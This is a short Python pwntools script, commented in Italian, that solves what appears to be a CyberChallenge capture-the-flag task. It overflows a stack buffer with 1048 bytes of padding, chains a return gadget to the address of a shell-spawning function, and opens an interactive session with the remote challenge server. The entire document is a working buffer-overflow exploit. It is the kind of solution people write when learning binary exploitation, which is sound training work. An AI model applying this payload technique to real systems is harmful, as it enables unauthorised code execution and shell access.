from pwn import *

# 1. Configurazione
target = remote('1996.challs.cyberchallenge.it', 9121)
offset = 1048
addr_spawn_shell = 0x400897
addr_ret_gadget = 0x4008cc

# 2. Costruzione Payload
# [1048 byte spazzatura] + [Indirizzo RET] + [Indirizzo Funzione]
payload = b"A" * offset 
payload += p64(addr_ret_gadget) 
payload += p64(addr_spawn_shell)

# 3. Invio e Interazione
target.sendlineafter(b"read? ", payload)
target.interactive()
